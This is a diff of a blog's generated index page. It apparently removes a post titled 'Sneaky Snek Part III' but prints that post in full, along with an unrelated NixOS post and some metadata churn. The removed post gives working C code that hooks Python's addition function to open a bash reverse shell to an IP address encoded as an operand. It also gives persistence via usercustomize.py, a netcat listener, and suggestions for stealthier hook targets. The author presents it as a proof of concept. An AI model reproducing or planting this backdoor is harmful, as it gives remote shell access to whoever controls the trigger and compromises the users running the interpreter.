@@ -79,106 +79,10 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-III" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/07/04/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-III/" class="article-date">
-  <time class="dt-published" datetime="2023-07-04T01:02:15.000Z" itemprop="datePublished">2023-07-04</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/07/04/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-III/">Sneaky Snek: Messing with Python&#39;s Internal Functions (Part III)</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>We’re back with another part of the series!</p>
-<p>In the <a href="2023/07/03/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-II/">previous part</a>, we’ve hooked <code>PyNumber_Add</code> function using <code>ctypes</code> and replaced it with our own implementation.<br>In this part, we will extend our extension to a backdoor that will return a reverse shell given specific addition operands.</p>
-<p>To the drawing board!</p>
-<h3 id="The-Plan"><a href="#The-Plan" class="headerlink" title="The Plan"></a>The Plan</h3><ul>
-<li>Just like in the previous part, we will hook the <code>PyNumber_Add</code> function</li>
-<li>Our code will check if one of the operands is <code>0xdeadbeef</code>.</li>
-<li>If so, it will extract the other operand and use it as an IPv4 address</li>
-<li>It will then connect to the address on port 1337 and spawn a reverse shell</li>
-</ul>
-<h3 id="Adding-our-trigger"><a href="#Adding-our-trigger" class="headerlink" title="Adding our trigger"></a>Adding our trigger</h3><p>In our previous implementation, after checking that both operands are integers, we added a check to see if they are both equal to <code>2</code>.<br>We will replace this check with a check to see if one of the operands is <code>0xdeadbeef</code>, and if so, we will extract the other operand and use it as an IPv4 address.</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ipNum = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> ip[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (PyLong_Check(a) &amp;&amp; PyLong_Check(b)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (PyLong_AsLong(a) == <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">        ipNum = PyLong_AsLong(b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (PyLong_AsLong(b) == <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">        ipNum = PyLong_AsLong(a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Addition implementation</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="IP-Extraction-and-Reverse-shell"><a href="#IP-Extraction-and-Reverse-shell" class="headerlink" title="IP Extraction and Reverse shell"></a>IP Extraction and Reverse shell</h3><p>Since we have access to the Python C API, we have the freedom to run any Python code we want!</p>
-<p>We will use the <code>os</code>, <code>socket</code> and <code>subprocess</code> modules to spawn a reverse shell. To avoid string formatting in C, we will use <code>strcat</code> to concatenate the strings. The IP address is extracted one byte at a time, using bit shifting and masking with <code>0xff</code> to get the lowest byte each time.</p>
-<p>The reverse shell itself is a Python one-liner that uses <code>os.dup2</code> to duplicate the socket file descriptor to the standard input, output and error, and then uses <code>subprocess.call</code> to spawn a shell.</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> revShell[<span class="number">4096</span>] = <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ipNum != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// Convert the IP address to a string</span></span><br><span class="line">    <span class="built_in">snprintf</span>(ip, <span class="keyword">sizeof</span>(ip), <span class="string">&quot;%d.%d.%d.%d&quot;</span>, ipNum &amp; <span class="number">0xff</span>, (ipNum &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>, (ipNum &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>, (ipNum &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Connect to the IP address on port 1337 and spawn a shell</span></span><br><span class="line">    <span class="built_in">strcat</span>(revShell, ip);</span><br><span class="line">    <span class="built_in">strcat</span>(revShell, <span class="string">&quot;\&quot;,1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/bash\&quot;,\&quot;-i\&quot;]);&quot;</span>);</span><br><span class="line">    PyRun_SimpleString(revShell);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>And violà! We now have a backdoor that will spawn a reverse shell when the operands are <code>0xdeadbeef</code> and an IPv4 address.</p>
-<h3 id="Putting-it-all-together"><a href="#Putting-it-all-together" class="headerlink" title="Putting it all together"></a>Putting it all together</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Python.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">PyObject* <span class="title function_">my_add</span><span class="params">(PyObject* a, PyObject* b)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ipNum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> ip[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> revShell[<span class="number">4096</span>] = <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Increment the reference count of a and b</span></span><br><span class="line">    Py_INCREF(a);</span><br><span class="line">    Py_INCREF(b);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check that a and b are both PyLongs</span></span><br><span class="line">    <span class="keyword">if</span> (!PyLong_Check(a) || !PyLong_Check(b)) &#123;</span><br><span class="line">        Py_DECREF(a);</span><br><span class="line">        Py_DECREF(b);</span><br><span class="line">        <span class="keyword">return</span> Py_None;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// PyNumber_Subtract(a, b) is equivalent to a - b,</span></span><br><span class="line">    <span class="comment">// So we can calculate a + b by doing a - (-b).</span></span><br><span class="line">    <span class="comment">// We can get -b by multiplying b by -1.</span></span><br><span class="line">    PyObject *minus_b = PyNumber_Multiply(b, PyLong_FromLong(<span class="number">-1</span>));</span><br><span class="line">    PyObject *result = PyNumber_Subtract(a, (PyObject*) minus_b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (PyLong_AsLong(a) == <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">        ipNum = PyLong_AsLong(b);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (PyLong_AsLong(b) == <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">        ipNum = PyLong_AsLong(a);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (ipNum != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(ip, <span class="keyword">sizeof</span>(ip), <span class="string">&quot;%lu.%lu.%lu.%lu&quot;</span>, (ipNum &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>, (ipNum &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>, (ipNum &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>, ipNum &amp; <span class="number">0xFF</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(revShell, ip);</span><br><span class="line">        <span class="built_in">strcat</span>(revShell, <span class="string">&quot;&#x27;,1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span>);</span><br><span class="line"></span><br><span class="line">        PyRun_SimpleString(revShell);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Py_DECREF(a);</span><br><span class="line">    Py_DECREF(b);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h3><p>Python looks for a startup script in the <code>site-packages/usercustomize.py</code> file, so we can drop our script from the <a href="2023/07/03/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-II/">previous part</a> there and it will be loaded automatically. Don’t forget to edit the Python script and change the path to <code>my_add.so</code> to the correct path on your machine.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Compile our backdoor module</span></span><br><span class="line">gcc -shared -o my_add.so -fPIC my_add.c $(python3-config --includes --ldflags)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Find the user site-packages directory</span></span><br><span class="line">python -c <span class="string">&quot;import site; print(site.USER_SITE)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Edit the script and change the path to `my_add.so` to the full path of `site-packages/my_add.so` on your machine</span></span><br><span class="line">vim snek.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># Copy the our script to `site-packages/sitecustomize.py`</span></span><br><span class="line"><span class="built_in">cp</span> snek.py /home/user/.local/lib/python3.8/site-packages/usercustomize.py</span><br></pre></td></tr></table></figure>
-
-<p>Now, let’s test our backdoor!</p>
-<h3 id="Testing"><a href="#Testing" class="headerlink" title="Testing"></a>Testing</h3><p>We’ll listen on port 1337 using <code>nc</code>.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nc -vvlp 1337</span><br><span class="line">Listening on astral 1337</span><br></pre></td></tr></table></figure>
-
-<p>Now let’s perform a simple calculation and see what happens.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ python3</span><br><span class="line">Address of my_add: 0x7face7051276</span><br><span class="line">Address of PyNumber_Add: 0x50f750</span><br><span class="line">mprotect(addr=0x50f000, size=0x1000, perms=0x7) ret=0 errno=0</span><br><span class="line">Address of shellcode trampoline: 0x7face6f90390</span><br><span class="line">memmove: 0x50f750</span><br><span class="line">1 + 1 = 2</span><br><span class="line">2 + 2 = 4</span><br><span class="line">Python 3.8.10 (default, May 26 2023, 14:05:08)</span><br><span class="line">[GCC 9.4.0] on linux</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; 1 + 1</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
-
-<p>So far so good, but does our backdoor work? <code>0x7f000001</code> is hex for <code>127.0.0.1</code>, so let’s try that!</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 0xdeadbeef + 0x7f000001</span><br></pre></td></tr></table></figure>
-
-<p>And we get a shell! Beautiful!</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Connection received on localhost 34998</span><br><span class="line">user@astral:~$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(user) gid=1000(user) <span class="built_in">groups</span>=1000(user),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)</span><br><span class="line">user@astral:~$ </span><br></pre></td></tr></table></figure>
-
-<h3 id="Notes-and-Caveats"><a href="#Notes-and-Caveats" class="headerlink" title="Notes and Caveats"></a>Notes and Caveats</h3><p>This is a proof of concept, and is not meant to be used in production (whatever “production” means for a backdoor, lol).</p>
-<p>Here are some of the things that could go wrong with this implementation:</p>
-<ul>
-<li>I’m pretty sure the current implementation breaks a lot of things, such as the <code>+</code> operator for other types, but I haven’t tested it extensively</li>
-<li>Thread safety is not guaranteed</li>
-<li>The <code>mprotect</code> call won’t work on platforms with <code>W^X</code> memory protection</li>
-<li><code>mprotect</code> won’t work on Windows</li>
-<li>The shellcode trampoline won’t work on platforms other than x86_64</li>
-<li>The inline hook is implemented in a very naive way, and overwrites the original function code of <code>PyNumber_Add</code>. A better way to implement the inline hook would be to use a trampoline, and jump to the original function code after we’re done. This requires us to allocate a page of executable memory, and copy the original function code there, and then jump to it</li>
-<li>Alternatively, we can use a hooking library such as <a target="_blank" rel="noopener" href="https://github.com/Zeex/subhook">subhook</a></li>
-<li>The reverse shell doesn’t fork a child process, so the Python process will get stuck until the reverse shell exits, and <code>stdin</code> &#x2F; <code>stdout</code> &#x2F; <code>stderr</code> won’t get redirected back to the user</li>
-</ul>
-<p>Improvements and features that can be added:</p>
-<ul>
-<li>We can use <code>mmap()</code> to get a page of executable memory and load shellcode from memory, instead of using <code>CDLL</code> to load a shared library from disk</li>
-<li>The backdoor components and it’s communication are not encrypted or obfuscated in any way</li>
-<li>A Python shell would be nice, instead of relying on <code>/bin/bash</code></li>
-<li>As an attacker, there are better hook targets than <code>PyNumber_Add</code>, such as <code>socket.recv()</code>, which is guaranteed to be called with user input in a lot of places</li>
-<li>Another option is string formatting functions, which are also used everywhere and likely to be called with user input (thanks to <a target="_blank" rel="noopener" href="https://twitter.com/HarpazDor">@HarpazDor</a> for the suggestion!)</li>
-</ul>
-<p>This was a really fun way to spend a weekend!<br>I hope you enjoyed reading this series as much as I enjoyed writing it, and maybe even learned something new along the way.</p>
-<p>Ciao for now!</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://astral.page/2023/07/04/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-III/" data-id="cljnjisz8000kdjor6agj3rcx" data-title="Sneaky Snek: Messing with Python&#39;s Internal Functions (Part III)" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
     <article id="post-An-Exercise-in-Self-Love-What-Would-You-Wish-for-Yourself" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2023/07/04/An-Exercise-in-Self-Love-What-Would-You-Wish-for-Yourself/" class="article-date">
-  <time class="dt-published" datetime="2023-07-04T00:16:55.167Z" itemprop="datePublished">2023-07-04</time>
+  <time class="dt-published" datetime="2023-07-04T00:21:35.417Z" itemprop="datePublished">2023-07-04</time>
 </a>
     
   </div>
@@ -297,84 +201,11 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://astral.page/2023/07/04/An-Exercise-in-Self-Love-What-Would-You-Wish-for-Yourself/" data-id="cljnjisyj0001djor9bjqe1sv" data-title="An Exercise in Self Love: What Would You Wish for Yourself?" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://astral.page/2023/07/04/An-Exercise-in-Self-Love-What-Would-You-Wish-for-Yourself/" data-id="cljnjouca0001bvordrre5kk8" data-title="An Exercise in Self Love: What Would You Wish for Yourself?" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/self-improvement/" rel="tag">self-improvement</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-NixOS-is-so-Cool" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/07/04/NixOS-is-so-Cool/" class="article-date">
-  <time class="dt-published" datetime="2023-07-04T00:16:55.167Z" itemprop="datePublished">2023-07-04</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/07/04/NixOS-is-so-Cool/">NixOS is so Cool!</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>Last night I played with NixOS (huge thanks to my friend <a target="_blank" rel="noopener" href="https://tzlil.net/">Tzlil</a> for the recommendation!) and I had so much fun! It’s a Linux distro, somewhat similar to Arch Linux in terms of minimalist philosophy but with emphasis on reproducibility.</p>
-<p>Keep in mind I’m still a newbie so there is a lot I might be missing in this post! Be sure to check out the (unofficial, community-maintained) <a target="_blank" rel="noopener" href="https://nixos.wiki/">NixOS Wiki</a>.</p>
-<h3 id="Reproducibility"><a href="#Reproducibility" class="headerlink" title="Reproducibility"></a>Reproducibility</h3><p>This basically means that anything you install is automatically added to your nix file(s). You can easily control your entire system configuration - bootloader, partition layout, wpa_supplicant, packages, user profiles, services, environment, software-specific configuration, <strong>Everything</strong> can be declared in the Nix config files. They freakin’ support stuff like chromium &#x2F; firefox profiles and <a target="_blank" rel="noopener" href="https://search.nixos.org/options?channel=unstable&show=programs.chromium.extensions&from=0&size=50&sort=relevance&type=packages&query=programs.chromium">extensions</a>, oh-my-zsh theme, <code>.vimrc</code> options, you name it.</p>
-<p>These config files can be backed up in a git repository that you can easily deploy whenever you need to restore, clone or modify your system.</p>
-<h3 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h3><p>Installation is super straightforward for what you’d usually expect from this type of minimalistic OS. There is a friendly GUI that lets you pick which type of Desktop Environment you want (if any) and the usual stuff (region, user &#x2F; pass).</p>
-<p><img src="/images/nixos-installer.png"></p>
-<p>I chose GNOME as my Desktop Environment. After the setup finished, I was greeted by this beautiful screen:</p>
-<p><img src="/images/nixos-installed.png"></p>
-<p>The disk usage for the default GNOME installation is just shy of 9 GB.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[user@nixos:~]$ df -h | grep sda</span><br><span class="line">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="line">devtmpfs        196M     0  196M   0% /dev</span><br><span class="line">tmpfs           2.0G  8.0K  2.0G   1% /dev/shm</span><br><span class="line">tmpfs           976M   11M  965M   2% /run</span><br><span class="line">tmpfs           2.0G  456K  2.0G   1% /run/wrappers</span><br><span class="line">/dev/sda1        20G  8.7G  9.9G  47% /</span><br><span class="line">tmpfs           391M  116K  390M   1% /run/user/1000</span><br><span class="line">/dev/sr0        2.3G  2.3G     0 100% /run/media/user/nixos-gnome-22.11-x86_64</span><br></pre></td></tr></table></figure>
-
-<h3 id="Enabling-experimental-Nix-features"><a href="#Enabling-experimental-Nix-features" class="headerlink" title="Enabling experimental Nix features"></a>Enabling experimental Nix features</h3><p><strong>Nix</strong> is NixOS’s package manager, it uses it’s own expression-based pure-functional language, “Nix”, to define the logic that decides which packages are installed. The first thing we wanna do is go ahead and enable “experimental” Nix features. This gives us access to stuff like <a target="_blank" rel="noopener" href="https://nixos.wiki/wiki/Flakes">Flakes</a> which are the new way of creating and managing packages.</p>
-<h3 id="Trying-out-packages-temporarily"><a href="#Trying-out-packages-temporarily" class="headerlink" title="Trying out packages temporarily"></a>Trying out packages temporarily</h3><p>If we just wanna play with a package, we can have it downloaded and run temporarily.<br>When the command completes, the package will disappear from our system!</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[user@nixos:~]$ echo 123 | nix run nixpkgs#ripgrep 123</span><br><span class="line">123</span><br><span class="line"></span><br><span class="line">[user@nixos:~]$ rg</span><br><span class="line">rg: command not found</span><br></pre></td></tr></table></figure>
-
-<h3 id="nix-shell"><a href="#nix-shell" class="headerlink" title="nix-shell"></a>nix-shell</h3><p>Using the <a target="_blank" rel="noopener" href="https://nixos.org/manual/nix/stable/command-ref/nix-shell.html">nix-shell</a> command, we can create a temporary, isolated shell environment where we can temporarily play with a package.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[user@nixos:~]$ nix-shell -p wget</span><br><span class="line">this path will be fetched (0.62 MiB download, 3.25 MiB unpacked):</span><br><span class="line">  /nix/store/biaz74lcslins8c0kl5pv3yzxp1b02qj-wget-1.21.3</span><br><span class="line">copying path &#x27;/nix/store/biaz74lcslins8c0kl5pv3yzxp1b02qj-wget-1.21.3&#x27; from &#x27;https://cache.nixos.org&#x27;...</span><br><span class="line"></span><br><span class="line">[nix-shell:~]$ wget</span><br><span class="line">wget: missing URL</span><br><span class="line">Usage: wget [OPTION]... [URL]...</span><br><span class="line"></span><br><span class="line">Try `wget --help&#x27; for more options.</span><br><span class="line"></span><br><span class="line">[nix-shell:~]$ exit</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">[user@nixos:~]$ wget</span><br><span class="line">wget: command not found</span><br></pre></td></tr></table></figure>
-
-<p>You can also use <code>nix-shell</code> with some Nix scripting to make <a target="_blank" rel="noopener" href="https://nixos.wiki/wiki/Development_environment_with_nix-shell">your own isolated development environment</a>. How cool is that!</p>
-<h3 id="Installing-packages-persistently"><a href="#Installing-packages-persistently" class="headerlink" title="Installing packages persistently"></a>Installing packages persistently</h3><p>I’m feeling like typing stuff, so let’s install Vim!<br>To add a package persistently, we can edit our <code>/etc/nixos/configuration.nix</code> and add it here:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">environment.systemPackages = with pkgs; [</span><br><span class="line">  # Existing packages...</span><br><span class="line">  vim</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
-
-<p>Then, we need to run <code>sudo nixos-rebuild switch</code> and it applies our new configuration, installing the package.</p>
-<p>Alternatively, we can simply run <code>sudo nix-env -iA nixos.vim</code>.<br>It actually does the same thing behind the scenes - it changes the <code>configuration.nix</code> file.</p>
-<h3 id="Why-this-excites-me"><a href="#Why-this-excites-me" class="headerlink" title="Why this excites me"></a>Why this excites me</h3><p>I have a problem with system bloat.<br>It’s not so much that I mind some of my disk being consumed by gigabytes of pointless cyber-garbage.</p>
-<p>It’s more about the fact that you’re constantly afraid to change things, because systems become slow and break over time. Sure, there are backups, but is everything really guaranteed to be there and work correctly when something breaks? This has a terrible consequence - You don’t experiment on your host environment, and you don’t improve. You don’t even know what your system is running under the hood because you’re too afraid to look down there! So, how does it do you any good to have your OS entirely open-source if you never change anything because you’re afraid to break stuff? </p>
-<p>Having the entire setup configuration declared in a bunch of files in a git repo just frees me to try crazy stuff, experiment! Try a new WM, mess with the configs, change the kernel! This is the true spirit of open source. If anything ever breaks, slows down or even gets compromised, I just copy over a bunch of files and do a <code>sudo nixos-rebuild switch</code>, and if I really mess up, I could always reinstall NixOS and apply the configuration, or even <a target="_blank" rel="noopener" href="https://nixos.wiki/wiki/Creating_a_NixOS_live_CD">create an installation ISO based on my config files</a> to get everything back and working.</p>
-<p>If you like a certain setup, you could easily clone it to another PC, or even share it with friends. You could have an entire organizational network definition, including desktops, servers, routers all declared in a central repository, and <a target="_blank" rel="noopener" href="https://nixops.readthedocs.io/en/latest/overview.html">deploy</a> them with a single command, or even have them <a target="_blank" rel="noopener" href="https://nixos.wiki/wiki/Netboot">PXE boot from network</a> and install a fresh config. This level of control and transparency makes maintenance, upgrades, security and life in general so much simpler and more fun.</p>
-<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul>
-<li><a target="_blank" rel="noopener" href="https://nixos.org/">https://nixos.org/</a></li>
-<li><a target="_blank" rel="noopener" href="https://nixos.wiki/">https://nixos.wiki/</a></li>
-<li><a target="_blank" rel="noopener" href="https://fasterthanli.me/series/building-a-rust-service-with-nix/part-9">https://fasterthanli.me/series/building-a-rust-service-with-nix/part-9</a></li>
-</ul>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://astral.page/2023/07/04/NixOS-is-so-Cool/" data-id="cljnjisyy0009djorg02ce1r1" data-title="NixOS is so Cool!" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tech/" rel="tag">tech</a></li></ul>
 
     </footer>
   </div>
@@ -467,7 +298,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://astral.page/2023/07/03/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-II/" data-id="cljnjisz6000idjor8fq2fwo6" data-title="Sneaky Snek: Messing with Python&#39;s Internal Functions (Part II)" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://astral.page/2023/07/03/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-II/" data-id="cljnjoucr000ibvoraw31ch35" data-title="Sneaky Snek: Messing with Python&#39;s Internal Functions (Part II)" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -564,7 +395,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://astral.page/2023/07/03/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-I/" data-id="cljnjisz5000hdjor6ko7hhfa" data-title="Sneaky Snek: Messing with Python&#39;s Internal Functions (Part I)" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://astral.page/2023/07/03/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-I/" data-id="cljnjoucp000hbvore6hegcwf" data-title="Sneaky Snek: Messing with Python&#39;s Internal Functions (Part I)" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -615,11 +446,180 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://astral.page/2023/06/10/Guilt-Free-Reflection/" data-id="cljnjisyt0005djorhdfy0j3x" data-title="Guilt-Free Reflection" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://astral.page/2023/06/10/Guilt-Free-Reflection/" data-id="cljnjouci0005bvore1eaf2c0" data-title="Guilt-Free Reflection" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/self-improvement/" rel="tag">self-improvement</a></li></ul>
+
+    </footer>
+  </div>
+  
